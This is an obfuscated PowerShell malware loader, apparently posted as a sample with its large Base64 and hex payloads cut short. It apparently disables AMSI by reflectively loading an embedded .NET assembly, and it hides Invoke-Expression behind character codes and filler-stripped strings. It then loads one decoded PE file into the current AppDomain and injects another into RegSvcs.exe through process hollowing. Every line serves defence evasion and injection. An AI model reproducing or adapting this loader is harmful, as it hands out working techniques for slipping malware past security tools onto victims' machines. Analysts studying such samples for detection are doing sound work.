$book="AAAAAAAAAQAAAAA...wrGwhvjgAACgsGB2+PAAAKB2+QAAAKJSZvkQAACgh" # NOTE: The actual 9332-character Base64 string omitted for readability.
$dook="vTwAACiUmLdveHQgsGRtFAQAAAPb///8XLQbQNQAABiYIb0EAAArcAwZvkgAACiUmb5MAAAoqAAEQAAACABYAKT8AHQAAAAATMAYA3QAAABoAABF+FgAABAJKKFcAAAoKAiVKGlhUBi0UGUUBAAAA9v///xctBtA2AAAGJ...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" # NOTE: The actual 24781-character Base64 string omitted for readability.
$hook="{end}T{end}{end}V{end}{end}qQAA{end}{end}{end}MAAA{end}{end}{end}AEA{end}AA{end}{end}A//{end}{end}8AA{end}{end}Lg"
$hook=($hook).replace('{end}', '')
$took=$hook+$book+$dook
$jook =@($took)
function Hook-AMSI
{
    if(-not ([System.Management.Automation.PSTypeName]"Hook").Type) {[Reflection.Assembly]::Load([Convert]::FromBase64String($jook)) |	Out-Null;
    }
    [Hook]::Now()
}
IEX Hook-AMSI
 $CA=[char]73 + [char]69 + [char]88
sal NX $CA
[String]$GB='4D5A90000300000...0000000000000000000000000' # NOTE: The actual 569344-character Base64 string omitted for readability.
function JOO {
    param($IT)
    $IT = $IT -split '(..)' | ? { $_ }
    ForEach ($RS in $IT){
        [Convert]::ToInt32($RS,16)
    }
}
 [String]$JP='4D5A90000300000004...00000000000000' # NOTE: The actual 110592-character Base64 string omitted for readability.
 [Byte[]]$RO=JOO $JP
$AE='[S{YO}y{YO}{YO}s{YO}te{YO}m.{YO}A{YO}p{YO}p{YO}{YO}Do{YO}{YO}ma{YO}{YO}i{YO}n]'.replace('{YO}','')|NX;$EU=$AE.GetMethod("get_CurrentDomain")
$SK='$EU.I{YO}n{YO}{YO}v{YO}{YO}o{YO}k{YO}e(${YO}n{YO}{YO}ul{YO}l,{YO}${YO}n{YO}{YO}l{YO}{YO}l)'.replace('{YO}','')| NX
$FR='$SK.L{YO}o{YO}{YO}a{YO}{YO}d($RO)'.Replace('{YO}','')
$FR| NX
 [Byte[]]$GB2= JOO $GB
 [Friday.Boya]::KG('RegSvcs.exe',$GB2)
